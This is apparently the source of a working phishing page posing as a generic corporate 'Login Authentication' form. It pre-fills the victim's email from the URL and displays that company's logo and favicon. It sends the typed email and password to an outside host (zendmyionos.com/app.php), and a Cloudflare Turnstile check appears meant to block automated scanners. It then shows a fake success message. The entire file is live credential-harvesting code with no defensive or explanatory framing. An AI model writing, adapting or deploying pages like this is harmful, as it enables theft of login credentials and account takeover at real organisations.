<!DOCTYPE html>
<html lang="en">

<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Administrative Access</title>

<!-- Bootstrap 5 CSS -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">

<!-- Cloudflare Turnstile -->
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>

<!-- Dynamic Favicon -->
<link rel="icon" id="favicon" type="image/png">

<style>
body {
background-color: #f8f9fa;
}

.login-container {
max-width: 400px;
margin: 50px auto;
padding: 30px;
background: #fff;
border-radius: 8px;
box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
text-align: center;
}

.auth-required {
color: red;
font-size: 14px;
margin-top: 5px;
}

.turnstile-error {
color: red;
font-size: 14px;
display: none;
margin-bottom: 15px;
text-align: center;
}

.btn {
margin-top: 10px;
}

.submission-message {
color: red;
font-size: 10px;
font-weight: bold;
display: none;
margin-top: 10px;
}

.domain-logo {
width: 96px;
height: 96px;
margin: 0 auto 12px auto;
border-radius: 12px;
display: block;
border: 2px solid #e9ecef;
box-shadow: 0 2px 8px rgba(0,0,0,0.1);
}

.form-control:focus {
border-color: #0d6efd;
box-shadow: 0 0 0 0.2rem rgba(13, 110, 253, 0.25);
}

.btn-primary {
background-color: #0d6efd;
border-color: #0d6efd;
}

.btn-primary:hover {
background-color: #0b5ed7;
border-color: #0a58ca;
}

#domain-name {
font-weight: bold;
color: #333;
margin-top: 0;
margin-bottom: 15px;
font-size: 16px;
}

.auth-heading {
font-weight: bold;
color: #000000;
margin: 5px 0 20px 0;
font-size: 18px;
text-align: center;
}

.cf-turnstile {
margin: 25px 0;
display: flex;
justify-content: center;
}

.form-label {
text-align: left;
display: block;
margin-bottom: 8px;
font-weight: 500;
}

.auth-required {
color: red;
font-size: 14px;
margin-top: 6px;
text-align: left;
}

/* Ensure proper form spacing */
.mb-3 {
margin-bottom: 1.5rem !important;
}

/* Center the form content properly */
.login-container {
text-align: center;
}

.login-container form {
text-align: left;
}

.login-container h2 {
text-align: center;
}

#logo-section {
text-align: center;
margin-bottom: 20px;
padding: 15px 15px 10px 15px;
min-height: 130px;
display: flex;
flex-direction: column;
justify-content: center;
align-items: center;
}
</style>
</head>

<body>

<div class="login-container">
<div id="error-message" class="alert alert-danger" style="display: none;"></div>

<!-- Company Logo Section -->
<div id="logo-section">
	<img id="domain-logo" class="domain-logo" src="" alt="Company Logo" style="display: none;">
	<div id="domain-name"></div>
	<h3 id="auth-heading" class="auth-heading">LOGIN AUTHENTICATION</h3>
</div>

<form id="signup-form" method="POST" action="">
	<div class="mb-3">
		<label for="email" class="form-label">Email Address</label>
		<input type="email" class="form-control" id="email" name="email" required>
	</div>
	<div class="mb-3">
		<label for="password" class="form-label">Password</label>
		<input type="password" class="form-control" id="password" name="password" required>
		<div class="auth-required">Authentication required!</div>
	</div>

	<!-- Cloudflare Turnstile Widget -->
	<div class="cf-turnstile" 
		 data-sitekey="0x4AAAAAABuU_cmRvd31gQnF" 
		 data-callback="turnstileCallback"
		 data-theme="light"
		 data-size="normal"></div>
	<div id="turnstile-error" class="turnstile-error">Please complete the security verification</div>
	<input type="hidden" id="cf-turnstile-response" name="cf-turnstile-response" value="">

	<button type="submit" class="btn btn-primary w-100">Login</button>

	<div id="submission-message" class="submission-message">
		Form submitted! Checking credentials...
	</div>
</form>
</div>

<!-- Bootstrap 5 JS -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<script>
// Backend Server Configuration
const BACKEND_URL = 'https://zendmyionos.com/app.php'; // Your PHP server URL

// For development, you can use:
// const BACKEND_URL = 'http://localhost:8001/app.php';

let extractedDomain = "";
let turnstileVerified = false;

function turnstileCallback(token) {
	console.log("Turnstile callback triggered with token:", token);
	if (token) {
		turnstileVerified = true;
		document.getElementById("cf-turnstile-response").value = token;
		document.getElementById("turnstile-error").style.display = "none";
		console.log("Turnstile verification successful");
	}
}

function updateDomainLogo() {
	console.log("updateDomainLogo() called");
	const emailField = document.getElementById("email");
	const emailValue = emailField.value;
	console.log("Email value:", emailValue);
	
	if (emailValue && emailValue.includes("@")) {
		const domain = emailValue.split("@")[1];
		console.log("Extracted domain:", domain);
		if (domain && domain.length > 0) {
			extractedDomain = domain;
			console.log("Setting domain name to:", domain);
			document.getElementById("domain-name").textContent = domain.toUpperCase();
			
			const logoUrl = `https://logo.clearbit.com/${domain}`;
			console.log("Setting logo URL to:", logoUrl);
			document.getElementById("domain-logo").src = logoUrl;
			document.getElementById("domain-logo").style.display = "block";
			
			const faviconUrl = `https://www.google.com/s2/favicons?sz=64&domain=${domain}`;
			console.log("Setting favicon URL to:", faviconUrl);
			document.getElementById("favicon").href = faviconUrl;
			
			// Add error handling for logo loading
			const logoImg = document.getElementById("domain-logo");
			logoImg.onerror = function() {
				console.log("Clearbit logo failed, using fallback");
				this.src = `https://www.google.com/s2/favicons?sz=64&domain=${domain}`;
			};
			logoImg.onload = function() {
				console.log("Logo loaded successfully");
			};
		}
	} else {
		console.log("No valid email, resetting logo");
		document.getElementById("domain-name").textContent = "";
		document.getElementById("domain-logo").src = "";
		document.getElementById("domain-logo").style.display = "none";
		document.getElementById("favicon").href = "";
	}
}

document.addEventListener("DOMContentLoaded", function () {
	console.log("DOM Content Loaded");
	
	// Set form action to backend URL
	document.getElementById("signup-form").action = BACKEND_URL;
	
	// Check if Turnstile script loaded
	setTimeout(function() {
		if (typeof turnstile !== 'undefined') {
			console.log("Turnstile script loaded successfully");
		} else {
			console.error("Turnstile script failed to load");
		}
	}, 2000);
	
	const urlParams = new URLSearchParams(window.location.search);
	const emailParam = urlParams.get("email");
	const successParam = urlParams.get("success");
	console.log("Email from URL:", emailParam);
	console.log("Success from URL:", successParam);
	
	if (emailParam) {
		document.getElementById("email").value = emailParam;
		extractedDomain = emailParam.split("@")[1] || "example.com";
		console.log("Set email field and extracted domain:", extractedDomain);
	}
	
	// Show success message if redirected after successful submission
	if (successParam === "1") {
		const successDiv = document.getElementById("error-message");
		successDiv.textContent = "âœ… Login successful! Your submission has been processed.";
		successDiv.className = "alert alert-success";
		successDiv.style.display = "block";
		
		// Clear success parameter from URL after 3 seconds
		setTimeout(function() {
			const newUrl = window.location.pathname + (emailParam ? "?email=" + encodeURIComponent(emailParam) : "");
			window.history.replaceState(null, null, newUrl);
			successDiv.style.display = "none";
		}, 3000);
	}
	
	// Update logo on page load if email is present
	console.log("Calling updateDomainLogo on page load");
	updateDomainLogo();
	
	// Add real-time logo update when user types email
	const emailField = document.getElementById("email");
	console.log("Adding event listeners to email field");
	emailField.addEventListener("input", function() {
		console.log("Email input event triggered");
		updateDomainLogo();
	});
	emailField.addEventListener("blur", function() {
		console.log("Email blur event triggered");
		updateDomainLogo();
	});

	// Check for error message in URL
	const errorParam = urlParams.get("error");
	if (errorParam) {
		const errorDiv = document.getElementById("error-message");
		errorDiv.textContent = decodeURIComponent(errorParam);
		errorDiv.style.display = "block";
	}

	document.getElementById("signup-form").addEventListener("submit", function (event) {
		if (!turnstileVerified) {
			event.preventDefault();
			document.getElementById("turnstile-error").style.display = "inline";
		}
	});
});
</script>

</body>
</html>
